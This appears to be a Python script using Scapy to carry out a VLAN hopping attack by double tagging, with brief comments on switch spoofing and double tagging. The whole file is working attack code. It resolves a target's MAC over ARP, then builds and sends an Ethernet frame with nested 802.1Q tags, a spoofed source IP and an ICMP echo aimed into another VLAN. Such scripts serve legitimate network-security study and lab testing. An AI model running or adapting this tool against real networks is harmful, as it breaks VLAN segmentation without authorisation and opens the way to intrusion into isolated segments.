from scapy.all import *

# VLAN Hopping - when an attacker escapes their assigned VLAN and sends traffic into another VLAN
# 1. Switch spoofing - attacker tricks a switch port into becoming a trunk port;
# Trunk ports carry traffic for multiple VLANs; normally used between switches, not for ordinary hosts
# 2. Double tagging

import sys
from scapy.all import (
    Ether, Dot1Q, IP, ICMP,
    sendp, get_if_hwaddr, ARP, srp,
)

INTERFACE = "eth0"


def get_mac(ip: str) -> str:
    """Resolve MAC address of IP via ARP broadcast."""
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=INTERFACE, verbose=False,
    )
    for _, reply in answered:
        return reply[Ether].src
    raise RuntimeError(f"No MAC address found for {ip}")


def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <attacker_vlan> <target_vlan> <target_ip>",
              file=sys.stderr)
        sys.exit(1)

    attacker_vlan = int(sys.argv[1])
    target_vlan = int(sys.argv[2])
    target_ip = sys.argv[3]

    attacker_mac = get_if_hwaddr(INTERFACE)
    print(f"[*] Attacker MAC: {attacker_mac}")

    try:
        target_mac = get_mac(target_ip)
        print(f"[*] Target MAC: {target_mac}")
    except RuntimeError:
        target_mac = "ff:ff:ff:ff:ff:ff"
        print(f"[*] Could not resolve target MAC, using broadcast: {target_mac}")

    pkt = (
        Ether(src=attacker_mac, dst=target_mac) /
        Dot1Q(vlan=attacker_vlan) /
        Dot1Q(vlan=target_vlan) /
        IP(src=f"192.168.120.100", dst=target_ip) /
        ICMP(type=8, code=0, id=0, seq=0)
    )

    print(f"[*] Sending double-tagged ICMP echo request:")
    print(f"    Outer VLAN: {attacker_vlan}")
    print(f"    Inner VLAN: {target_vlan}")
    print(f"    Destination IP: {target_ip}")
    pkt.show()

    sendp(pkt, iface=INTERFACE, verbose=False)
    print(f"[*] Packet sent!")


if __name__ == "__main__":
    main()
